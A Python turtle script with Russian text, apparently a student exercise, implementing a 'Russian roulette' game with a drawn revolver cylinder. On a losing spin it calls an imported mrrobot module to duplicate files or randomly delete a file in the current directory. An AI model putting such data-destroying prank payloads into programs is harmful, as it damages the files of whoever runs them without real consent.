# coding: utf-8

import turtle
import random
import math

import mrrobot

PHI = 360 / 7
R = 50

def gotoxy(x, y):
    turtle.penup()
    turtle.goto(x, y)
    turtle.pendown()

def draw_circle(color, r):
    turtle.fillcolor(color)
    turtle.begin_fill()
    turtle.circle(r)
    turtle.end_fill()

turtle.speed(0)

def draw_pistol(base_x, base_y):
    #Основной круг
    gotoxy(base_x, base_y)
    turtle.circle(80)
    #Мушка
    gotoxy(base_x, base_y + 165)
    draw_circle("red", 7)

    #Барабан
    for i in range(0, 7):
        phi_rad = PHI * i * math.pi / 180.0
        gotoxy(base_x + math.sin(phi_rad) * R, base_y + math.cos(phi_rad) * R + 57)
        draw_circle("white", 21)

def rotate_pistol(base_x, base_y, start):

    for i in range(start, random.randrange(7, 35)):
        phi_rad = PHI * i * math.pi / 180.0
        gotoxy(base_x + math.sin(phi_rad) * R, base_y + math.cos(phi_rad) * R + 57)
        draw_circle("brown", 21)
        draw_circle("white", 21)

    gotoxy(base_x + math.sin(phi_rad) * R, base_y + math.cos(phi_rad) * R + 57)
    draw_circle("brown", 21)

    return i % 7


draw_pistol(100, 100)

answer = ''
start = 0
nomber_rounnd = 0
while answer != 'n':
    answer = turtle.textinput("Играть?", "y/n")
    if answer == 'y':
        start = rotate_pistol(100, 100, start)

        if start == 0:
            gotoxy(-150, 270)
            turtle.write("Вы проиграли!", font=("Arial", 18, "normal"))
            gotoxy(-150, 290)
            turtle.write("Колличество игр: ", nomber_rounnd, font=("Arial", 18, "normal"))
            z = random.randrange(0, 3)
            if z == 0:
                mrrobot.duble_files('.')
                gotoxy(-100, -50)
                turtle.write("Теперь у вас в 2 раза больше файлов!", font=("Arial", 20, "normal"))
            elif z == 1:
                mrrobot.random_delete('.')
                gotoxy(-100, -50)
                turtle.write("Ха минус один файл!", font=("Arial", 20, "normal"))
            else:
                gotoxy(-100, -50)
                turtle.write("Вам повезло наказания не будет!", font=("Arial", 20, "normal"))
        else:
            nomber_rounnd += 1
            
    else:
        pass